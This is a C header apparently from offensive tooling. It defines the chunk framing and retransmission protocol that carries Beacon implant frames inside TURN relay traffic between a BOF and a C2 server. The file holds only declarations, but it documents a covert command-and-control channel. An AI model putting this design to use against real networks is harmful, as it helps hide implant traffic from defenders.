// proto.h — the chunk framing carried inside TURN DATA between the BOF and
// the UDC2 server, mirroring internal/proto/chunk.go (12-byte header):
//
//   [session_id:4 BE][type:1][msg_seq:1][frag_index:2 BE][frag_total:2 BE][length:2 BE][payload]
//
// type 1 = DATA (a fragment of one Beacon frame), type 2 = RESEND
// (payload: u16 count + count fragment indices). The relayed hop between
// the two TURN allocations is lossy UDP, so both directions implement this
// simple ARQ: retransmit what the peer asks for, and ask for what is
// missing when the stream stalls.
#ifndef BOF_PROTO_H
#define BOF_PROTO_H

#include "dfr.h"
#include "turn.h"

#define CHUNK_HEADER 12

#define CHUNK_TYPE_DATA 1
#define CHUNK_TYPE_RESEND 2

// Stall time with a gap in the inbound message before requesting a
// retransmission (matches the server).
#define PROTO_STALL_MS 600

// At most this many missing indices per RESEND request.
#define PROTO_MAX_MISSING 64

typedef struct _CHUNK_ASM {
    unsigned long session;
    unsigned char msgSeq;
    unsigned short fragTotal;

    unsigned char* recv;       // one byte per fragment: received?
    unsigned char* buf;        // reassembly buffer (VirtualAlloc'd)
    unsigned long bufCap;
    unsigned long bufLen;
    unsigned long fragSize;    // 0 until a non-final fragment arrives
    unsigned char* lastFrag;   // copy of the final fragment, placed
                               // once the layout (fragSize) is known
    unsigned long lastFragLen;
    unsigned long count;
    unsigned long bytes;
} CHUNK_ASM;

// Sends frame as DATA chunks with the given message sequence number and
// remembers it for retransmission (proto_handle_resend). Returns 0 on
// success. The frame buffer must stay valid until the next call.
int proto_send_frame(TURN_CTX* t, unsigned long session, unsigned char msgSeq,
                     const unsigned char* frame, unsigned long frameLen);

// Receives chunks (handling RESEND requests for the outgoing frame and
// issuing RESEND requests for gaps in the inbound frame) until a complete
// frame is reassembled. Returns 1 with *outLen set (the message lives in
// the assembler's buffer), 0 on deadline, -1 on error.
int proto_recv_frame(TURN_CTX* t, CHUNK_ASM* a, unsigned long session,
                     unsigned long long deadline,
                     unsigned char** out, unsigned long* outLen);

// Frees assembler storage.
void proto_asm_free(CHUNK_ASM* a);

#endif
